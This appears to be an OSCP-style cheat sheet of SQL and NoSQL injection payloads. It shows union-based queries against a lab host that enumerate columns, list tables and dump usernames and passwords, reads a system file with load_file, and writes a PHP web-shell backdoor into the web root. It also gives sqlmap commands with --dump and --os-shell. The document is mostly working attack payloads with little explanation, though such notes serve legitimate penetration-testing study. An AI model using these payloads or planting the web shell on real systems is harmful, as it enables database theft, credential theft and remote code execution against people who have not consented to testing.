### Payloads

```SQL
' or 1=1 -- true
 [Nothing]
'
"
`
')
")
`)
'))
"))
`))
' or 1=1 -- true
```


### Comments
```SQL
MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/

HQL
HQL does not support comments
```



### Column Number Enumeration

```SQL
http://10.11.0.22/debug.php?id=55 order by 1
# we need to increment 1 until we get error => number of columns
```

### Understanding the Layout of the Output

```SQL
http://10.11.0.22/debug.php?id=1 union all select 1, 2, 3
IF we Get 3 fiels printed : that our max exfitration of data
```

### Extracting Data from the Database
```SQL
http://10.11.0.22/debug.php?id=1 union all select 1, 2, @@version
http://10.11.0.22/debug.php?id=1 union all select 1, 2, user()
```

```SQL
http://10.11.0.22/debug.php?id=1 union all select 1, 2, table_name from information_schema.tables

#TO UNDERSTAND THE LOGIC :
#(FIRST QUERY return 3 outputs) union all (THE SECOUND PAYLOAD QUERY MUST return 3 outputs)
#(SELECT 1,2,3 FROM XXX) UNION ALL (SELECT 1,2,3 FROM YYY)

```

```SQL
http://10.11.0.22/debug.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'
```

```SQL
http://10.11.0.22/debug.php?id=1 union all select 1, username, password from users
```

### From SQL Injection to Code Execution
*Read file from FS*
```SQL
http://10.11.0.22/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
```
*Write to File In FS*
```SQL
http://10.11.0.22/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE "C:/wamp/www/PHP/upload/tmp/backdoor.php"
```

### SQLMap -- Forbidden  in OSCP

```bash
sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id"
```

```bash
sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --dump
```

```shell
sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --os-shell
```



## NOSQL

### Paylaod

```SQL
' || 'a'=='a
sleep (10000)
```

#### Json
```json
{"$ne": 1}
```

#### PHP

```php
param => [ '$regex': => '\d+' ] // Payload: [ '$regex': => '\d+' ]
```